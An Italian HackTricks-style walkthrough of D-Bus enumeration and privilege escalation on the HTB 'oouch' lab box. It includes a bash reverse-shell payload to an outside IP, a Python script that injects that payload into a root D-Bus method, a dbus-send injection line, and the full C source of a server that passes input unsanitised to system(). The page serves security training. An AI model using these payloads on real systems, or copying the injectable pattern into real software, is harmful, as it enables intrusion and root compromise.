# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **Enumerazione GUI**

D-Bus è utilizzato come mediatore per le comunicazioni inter-processo (IPC) negli ambienti desktop di Ubuntu. Su Ubuntu, si osserva il funzionamento simultaneo di diversi bus di messaggi: il bus di sistema, principalmente utilizzato da **servizi privilegiati per esporre servizi rilevanti per l'intero sistema**, e un bus di sessione per ogni utente connesso, che espone servizi rilevanti solo per quell'utente specifico. L'attenzione qui è principalmente sul bus di sistema a causa della sua associazione con servizi che operano con privilegi più elevati (ad esempio, root) poiché il nostro obiettivo è elevare i privilegi. Si nota che l'architettura di D-Bus impiega un 'router' per ogni bus di sessione, responsabile della reindirizzazione dei messaggi dei client ai servizi appropriati in base all'indirizzo specificato dai client per il servizio con cui desiderano comunicare.

I servizi su D-Bus sono definiti dagli **oggetti** e **interfacce** che espongono. Gli oggetti possono essere paragonati a istanze di classe nei linguaggi OOP standard, con ogni istanza identificata in modo univoco da un **percorso oggetto**. Questo percorso, simile a un percorso di filesystem, identifica in modo univoco ciascun oggetto esposto dal servizio. Un'interfaccia chiave per scopi di ricerca è l'interfaccia **org.freedesktop.DBus.Introspectable**, che presenta un metodo singolare, Introspect. Questo metodo restituisce una rappresentazione XML dei metodi, segnali e proprietà supportati dall'oggetto, con un focus qui sui metodi escludendo proprietà e segnali.

Per la comunicazione con l'interfaccia D-Bus, sono stati impiegati due strumenti: uno strumento CLI chiamato **gdbus** per l'invocazione facile dei metodi esposti da D-Bus negli script, e [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), uno strumento GUI basato su Python progettato per enumerare i servizi disponibili su ciascun bus e per visualizzare gli oggetti contenuti all'interno di ciascun servizio.
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Nella prima immagine sono mostrati i servizi registrati con il bus di sistema D-Bus, con **org.debin.apt** evidenziato specificamente dopo aver selezionato il pulsante System Bus. D-Feet interroga questo servizio per oggetti, visualizzando interfacce, metodi, proprietà e segnali per gli oggetti scelti, come visto nella seconda immagine. La firma di ogni metodo è anche dettagliata.

Una caratteristica notevole è la visualizzazione del **process ID (pid)** e della **linea di comando** del servizio, utile per confermare se il servizio viene eseguito con privilegi elevati, importante per la rilevanza della ricerca.

**D-Feet consente anche l'invocazione dei metodi**: gli utenti possono inserire espressioni Python come parametri, che D-Feet converte in tipi D-Bus prima di passarli al servizio.

Tuttavia, si noti che **alcuni metodi richiedono autenticazione** prima di consentirci di invocarli. Ignoreremo questi metodi, poiché il nostro obiettivo è elevare i nostri privilegi senza credenziali in primo luogo.

Si noti inoltre che alcuni dei servizi interrogano un altro servizio D-Bus chiamato org.freedeskto.PolicyKit1 se un utente dovrebbe essere autorizzato a eseguire determinate azioni o meno.

## **Enumerazione della linea di comando**

### Elenca gli oggetti del servizio

È possibile elencare le interfacce D-Bus aperte con:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### Connessioni

[Da wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Quando un processo stabilisce una connessione a un bus, il bus assegna alla connessione un nome speciale chiamato _nome di connessione unico_. I nomi di bus di questo tipo sono immutabili: è garantito che non cambieranno finché la connessione esiste e, cosa più importante, non possono essere riutilizzati durante la vita del bus. Ciò significa che nessun'altra connessione a quel bus avrà mai assegnato un nome di connessione unico, anche se lo stesso processo chiude la connessione al bus e ne crea una nuova. I nomi di connessione unici sono facilmente riconoscibili perché iniziano con il carattere due punti—altrimenti vietato.

### Informazioni sull'oggetto del servizio

Quindi, puoi ottenere alcune informazioni sull'interfaccia con:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### Elenca le interfacce di un oggetto servizio

Devi avere permessi sufficienti.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspect Interface of a Service Object

Nota come in questo esempio è stata selezionata l'ultima interfaccia scoperta utilizzando il parametro `tree` (_vedi sezione precedente_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Nota il metodo `.Block` dell'interfaccia `htb.oouch.Block` (quello che ci interessa). La "s" delle altre colonne potrebbe significare che si aspetta una stringa.

### Interfaccia di Monitoraggio/Cattura

Con privilegi sufficienti (solo i privilegi `send_destination` e `receive_sender` non sono sufficienti) puoi **monitorare una comunicazione D-Bus**.

Per **monitorare** una **comunicazione** avrai bisogno di essere **root.** Se riscontri ancora problemi ad essere root, controlla [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) e [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Se sai come configurare un file di configurazione D-Bus per **permettere agli utenti non root di sniffare** la comunicazione, per favore **contattami**!

Diversi modi per monitorare:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Nell'esempio seguente, l'interfaccia `htb.oouch.Block` è monitorata e **il messaggio "**_**lalalalal**_**" viene inviato attraverso una cattiva comunicazione**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Puoi usare `capture` invece di `monitor` per salvare i risultati in un file pcap.

#### Filtrare tutto il rumore <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Se ci sono troppe informazioni sul bus, passa una regola di corrispondenza in questo modo:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Possono essere specificate più regole. Se un messaggio corrisponde a _qualunque_ delle regole, il messaggio verrà stampato. Così:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Consulta la [documentazione di D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) per ulteriori informazioni sulla sintassi delle regole di corrispondenza.

### Maggiori informazioni

`busctl` ha ancora più opzioni, [**trovale tutte qui**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Scenario Vulnerabile**

Come utente **qtc all'interno dell'host "oouch" di HTB** puoi trovare un **file di configurazione D-Bus inaspettato** situato in _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Nota dalla configurazione precedente che **è necessario essere l'utente `root` o `www-data` per inviare e ricevere informazioni** tramite questa comunicazione D-BUS.

Come utente **qtc** all'interno del contenitore docker **aeb4525789d8** puoi trovare del codice relativo a dbus nel file _/code/oouch/routes.py._ Questo è il codice interessante:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Come puoi vedere, si sta **collegando a un'interfaccia D-Bus** e inviando alla **funzione "Block"** l'"client_ip".

Dall'altra parte della connessione D-Bus c'è un binario compilato in C in esecuzione. Questo codice sta **ascoltando** nella connessione D-Bus **per indirizzi IP e sta chiamando iptables tramite la funzione `system`** per bloccare l'indirizzo IP fornito.\
**La chiamata a `system` è vulnerabile di proposito all'injection di comandi**, quindi un payload come il seguente creerà una reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Sfruttalo

Alla fine di questa pagina puoi trovare il **codice C completo dell'applicazione D-Bus**. All'interno puoi trovare tra le righe 91-97 **come il `D-Bus object path`** **e il `interface name`** sono **registrati**. Queste informazioni saranno necessarie per inviare informazioni alla connessione D-Bus:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Inoltre, nella riga 57 puoi trovare che **l'unico metodo registrato** per questa comunicazione D-Bus si chiama `Block`(_**Ecco perché nella sezione seguente i payload verranno inviati all'oggetto servizio `htb.oouch.Block`, all'interfaccia `/htb/oouch/Block` e al nome del metodo `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Il seguente codice python invierà il payload alla connessione D-Bus al metodo `Block` tramite `block_iface.Block(runme)` (_nota che è stato estratto dal blocco di codice precedente_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl e dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` è uno strumento utilizzato per inviare messaggi al “Message Bus”
- Message Bus – Un software utilizzato dai sistemi per facilitare le comunicazioni tra le applicazioni. È correlato a Message Queue (i messaggi sono ordinati in sequenza) ma nel Message Bus i messaggi vengono inviati in un modello di abbonamento e sono anche molto veloci.
- Il tag “-system” è utilizzato per indicare che si tratta di un messaggio di sistema, non di un messaggio di sessione (per impostazione predefinita).
- Il tag “–print-reply” è utilizzato per stampare il nostro messaggio in modo appropriato e ricevere eventuali risposte in un formato leggibile dall'uomo.
- “–dest=Dbus-Interface-Block” L'indirizzo dell'interfaccia Dbus.
- “–string:” – Tipo di messaggio che desideriamo inviare all'interfaccia. Ci sono diversi formati per inviare messaggi come double, bytes, booleans, int, objpath. Tra questi, il “object path” è utile quando vogliamo inviare un percorso di un file all'interfaccia Dbus. Possiamo utilizzare un file speciale (FIFO) in questo caso per passare un comando all'interfaccia in nome di un file. “string:;” – Questo serve a richiamare nuovamente il percorso dell'oggetto dove posizioniamo il file/comando della shell inversa FIFO.

_Note che in `htb.oouch.Block.Block`, la prima parte (`htb.oouch.Block`) fa riferimento all'oggetto servizio e l'ultima parte (`.Block`) fa riferimento al nome del metodo._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Riferimenti

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

{{#include ../../banners/hacktricks-training.md}}
